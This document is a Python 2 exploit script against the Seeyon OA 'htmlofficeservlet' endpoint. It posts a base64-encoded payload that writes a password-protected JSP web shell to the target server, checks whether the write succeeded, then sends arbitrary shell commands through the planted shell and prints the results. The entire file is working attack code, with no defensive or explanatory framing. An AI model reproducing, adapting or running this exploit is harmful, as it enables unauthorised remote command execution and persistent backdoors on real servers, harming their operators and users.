import requests
import base64
import sys
import os
import re

def execCmd(cmd):  
	r = os.popen(cmd)
	text = r.read()
	r.close()
	return text
	

payload = 'REJTVEVQIFYzLjAgICAgIDM1NSAgICAgICAgICAgICAwICAgICAgICAgICAgICAgNjY2ICAgICAgICAgICAgIERCU1RFUD1PS01MbEtsVg0KT1BUSU9OPVMzV1lPU1dMQlNHcg0KY3VycmVudFVzZXJJZD16VUNUd2lnc3ppQ0FQTGVzdzRnc3c0b0V3VjY2DQpDUkVBVEVEQVRFPXdVZ2hQQjNzekIzWHdnNjYNClJFQ09SRElEPXFMU0d3NFNYekxlR3c0VjN3VXczelVvWHdpZDYNCm9yaWdpbmFsRmlsZUlkPXdWNjYNCm9yaWdpbmFsQ3JlYXRlRGF0ZT13VWdoUEIzc3pCM1h3ZzY2DQpGSUxFTkFNRT08bmFtZW5hbWU+DQpuZWVkUmVhZEZpbGU9eVJXWmRBUzYNCm9yaWdpbmFsQ3JlYXRlRGF0ZT13TFNHUDRvRXpMS0F6ND1pej02Ng0KPHBhZHBhZD48JUAgcGFnZSBsYW5ndWFnZT0iamF2YSIgaW1wb3J0PSJqYXZhLnV0aWwuKixqYXZhLmlvLioiIHBhZ2VFbmNvZGluZz0iVVRGLTgiJT48JSFwdWJsaWMgc3RhdGljIFN0cmluZyBleGN1dGVDbWQoU3RyaW5nIGMpIHtTdHJpbmdCdWlsZGVyIGxpbmUgPSBuZXcgU3RyaW5nQnVpbGRlcigpO3RyeSB7UHJvY2VzcyBwcm8gPSBSdW50aW1lLmdldFJ1bnRpbWUoKS5leGVjKGMpO0J1ZmZlcmVkUmVhZGVyIGJ1ZiA9IG5ldyBCdWZmZXJlZFJlYWRlcihuZXcgSW5wdXRTdHJlYW1SZWFkZXIocHJvLmdldElucHV0U3RyZWFtKCkpKTtTdHJpbmcgdGVtcCA9IG51bGw7d2hpbGUgKCh0ZW1wID0gYnVmLnJlYWRMaW5lKCkpICE9IG51bGwpIHtsaW5lLmFwcGVuZCh0ZW1wKyJcbiIpO31idWYuY2xvc2UoKTt9IGNhdGNoIChFeGNlcHRpb24gZSkge2xpbmUuYXBwZW5kKGUuZ2V0TWVzc2FnZSgpKTt9cmV0dXJuIGxpbmUudG9TdHJpbmcoKTt9ICU+PCVpZigiPHB3ZHB3ZD4iLmVxdWFscyhyZXF1ZXN0LmdldFBhcmFtZXRlcigicHdkIikpJiYhIiIuZXF1YWxzKHJlcXVlc3QuZ2V0UGFyYW1ldGVyKCJjbWQiKSkpe291dC5wcmludGxuKCI8cHJlPiIrZXhjdXRlQ21kKHJlcXVlc3QuZ2V0UGFyYW1ldGVyKCJjbWQiKSkgKyAiPC9wcmU+Iik7fWVsc2V7b3V0LnByaW50bG4oIjotKSIpO30lPg=='

url = sys.argv[1]
url1 = url + '/seeyon/htmlofficeservlet'
userfilename = sys.argv[2]
command = sys.argv[3]
password = sys.argv[4]

url2 = url + '/seeyon/{0}?pwd={1}&cmd={2}'
url2 = url2.format(userfilename, password, command)
pat1 = "decode = (.+?)\n"
pat2 = "<pre>([\s\S]*?)</pre>"
cmd = "java -jar seeyon_filename.jar encode {0}".format(userfilename)
result = execCmd(cmd)
filename = re.findall(pat1, result)[0]

prelen = len('qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdN1liN4KXwiVGzfT2dEg6')
padlen = prelen - len(filename)

pad = 'a' * padlen

payload = base64.b64decode(payload)
payload = payload.replace('<namename>', filename)
payload = payload.replace('<padpad>', pad)
payload = payload.replace('<pwdpwd>', password)

res = requests.post(url=url1, data=payload)
if 'OKMLlKlV' not in res.text:
	print '[-] It\'s not vulnerability'
	exit()

res = requests.get(url = url2)
cmdres = re.findall(pat2, res.text)[0]
print cmdres